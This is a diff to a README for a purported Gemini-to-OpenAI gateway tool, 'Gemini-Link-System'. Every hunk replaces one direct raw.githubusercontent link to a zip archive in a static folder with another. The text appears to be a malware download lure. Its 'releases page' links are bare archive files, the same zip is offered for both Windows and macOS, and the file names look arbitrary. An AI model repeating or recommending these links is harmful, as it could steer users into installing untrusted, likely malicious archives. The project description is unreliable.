@@ -1,7 +1,7 @@
 # 🚀 Gemini-Link-System - Effortlessly Connect Gemini to OpenAI
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Gemini-Link-System_lufbery.zip)](https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Gemini-Link-System_lufbery.zip)
+[![Download](https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Link_System_Gemini_1.5.zip)](https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Link_System_Gemini_1.5.zip)
 
 ## 📖 Description
 Gemini-Link-System is a gateway service that converts the Gemini Business API into an interface compatible with OpenAI. It supports multiple account load balancing, API key management, image generation, and displays the thought process behind the generated content. This application streamlines your experience by connecting two powerful services in a simple way.
@@ -16,9 +16,9 @@ Follow the steps below to download and run the Gemini-Link-System.
      - Disk Space: At least 200 MB free
    
 2. **Download the Application**
-   - Visit this page to download: [Gemini-Link-System Releases](https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Gemini-Link-System_lufbery.zip).
+   - Visit this page to download: [Gemini-Link-System Releases](https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Link_System_Gemini_1.5.zip).
    - On the releases page, find the latest version of Gemini-Link-System.
-   - Click on the file name that suits your operating system. For example, you might see something like `https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Gemini-Link-System_lufbery.zip` for Windows or `https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Gemini-Link-System_lufbery.zip` for macOS.
+   - Click on the file name that suits your operating system. For example, you might see something like `https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Link_System_Gemini_1.5.zip` for Windows or `https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Link_System_Gemini_1.5.zip` for macOS.
 
 3. **Install the Application**
    - Once the file downloads, navigate to your downloads folder.
@@ -79,4 +79,4 @@ Gemini-Link-System is open-source software. You can find the license details in 
 Stay updated with new features and bug fixes. Check the release notes on the releases page to see what has changed in each version.
 
 ## 📥 Download Again
-Remember, you can always [visit this page to download Gemini-Link-System](https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Gemini-Link-System_lufbery.zip) if you need the latest version or want to reinstall.
+Remember, you can always [visit this page to download Gemini-Link-System](https://raw.githubusercontent.com/putra121977/Gemini-Link-System/main/static/Link_System_Gemini_1.5.zip) if you need the latest version or want to reinstall.
